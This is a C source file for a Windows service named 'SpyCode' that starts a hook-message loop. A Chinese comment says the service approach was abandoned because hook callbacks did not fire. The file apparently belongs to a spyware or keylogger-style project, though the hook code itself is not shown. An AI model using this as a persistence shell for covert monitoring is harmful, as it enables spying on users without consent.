/*
* 遇到问题：钩子和windows服务不能同时运行
*			当运行服务时，钩子能够正常注册
*			但是却不执行回调函数，大概是因为
*			系统的权限问题，所以服务方案弃用
*/
#include "service.h"

SERVICE_STATUS ServiceStatus;  // 服务状态  
SERVICE_STATUS_HANDLE hStatus; // 服务状态句柄  

// Service initialization  
int InitService(){
	if(logCheckFile()){
		OutputDebugString("initialization failed");
		logToFile("========== SERVICE FAILED ==========");
		return -1;
	}
	OutputDebugString("SpyCode process started...");
	logToFile("========== SERCIVE STARTED ==========");
	return 0;
}

// Control Handler  
void ControlHandler(DWORD request){
	switch(request){
	case SERVICE_CONTROL_STOP:
		OutputDebugString("SpyCode process stoped...");
		logToFile("========== SERVICE STOPED ==========");
		ServiceStatus.dwWin32ExitCode = 0;   
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;   
        SetServiceStatus(hStatus,&ServiceStatus);  
		return;
	default:
		break;
	}
	//报告当前服务状态
	SetServiceStatus(hStatus,&ServiceStatus);  
	return;
}

void ServiceMain(int argc, char** argv){
	int error;
	ServiceStatus.dwServiceType = SERVICE_WIN32;	//设置服务类型为win32服务
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;	//设置服务当前状态
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;//接受停止服务控制命令 

	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	
	hStatus= RegisterServiceCtrlHandler("SpyCode",(LPHANDLER_FUNCTION)ControlHandler);	//注册控制函数句柄
	if (hStatus==(SERVICE_STATUS_HANDLE)0)
	{
		return;
	}
	//服务初始化过程
	error = InitService();
	if (error){		//初始化失败则设置当前服务状态以及错误代码
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;   
        ServiceStatus.dwWin32ExitCode = -1;   
        SetServiceStatus(hStatus, &ServiceStatus);   
        return;   
	}
	//开始运行服务
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;  
    SetServiceStatus(hStatus,&ServiceStatus);

	hookInit();
	while(ServiceStatus.dwCurrentState == SERVICE_RUNNING){
		hookMessage();
	}
	hookDestroy();
}

